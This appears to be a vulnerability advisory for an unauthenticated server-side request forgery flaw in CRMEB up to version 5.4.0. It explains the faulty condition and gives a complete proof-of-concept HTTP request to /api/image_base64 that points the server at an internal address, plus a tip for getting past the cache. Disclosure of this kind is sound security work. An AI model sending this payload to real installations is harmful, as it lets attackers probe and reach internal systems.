BUG_Author:
Rui Jie

Affected version:
CRMEB Standard Edition New Retail Social E-commerce System
Version<=5.4.0

Vendor:
https://www.crmeb.com/

Software:

https://gitee.com/ZhongBangKeJi/CRMEB

https://github.com/crmeb/CRMEB


Vulnerability File:
app/api/controller/v1/PublicController.php
app/common.php

Description:

A vulnerability classified as Server-Side Request Forgery has been identified in CRMEB. This affects sections of the app/api/controller/v1/PublicController.php file. Manipulation of the parameter image/code leads to Server-Side Request Forgery
It's an unauthorised interface, and doesn't even require any users.
A server-side request can be forged by anyone by visiting /api/image_base64 and passing the parameter image/code 


Pass json data
`{"image": "http://127.0.0.1:67?1=xxx", "code":""}`
Even if here on the incoming imageurl/codeurl judgement, but here there is a logical problem, through the `&&` connection of the conditional judgement, even if there is no picture suffix, will not meet the conditions, but also will continue to perform subsequent functions to image_to_base64 to achieve the SSRF attack

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121447950.png)
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121451269.png)
POC:
```
POST /api/image_base64 HTTP/1.1

Host: crmeb.cc

Origin: http://crmeb.cc

Cookie: cb_lang=zh-cn; PHPSESSID=c3db7bedde04b37c0bc6a5699dbde774

Upgrade-Insecure-Requests: 1

Content-Type: application/json

Referer: http://crmeb.cc//api/image_base64

Accept-Language: zh-CN,zh;q=0.9

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Cache-Control: max-age=0

Content-Length: 53

  

{"image":"http://127.0.0.1:67?1=12221231","code":""}
```
Trigger curl here(app/common.php)
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121444887.png)
![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121446514.png)

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121446706.png)

However, it should be noted that it uses the CacheService::remember method to try to get the Base64 encoding of the $imageUrl from the cache, which should be changed after the first execution `http://127.0.0.1:67/?1=change me`.
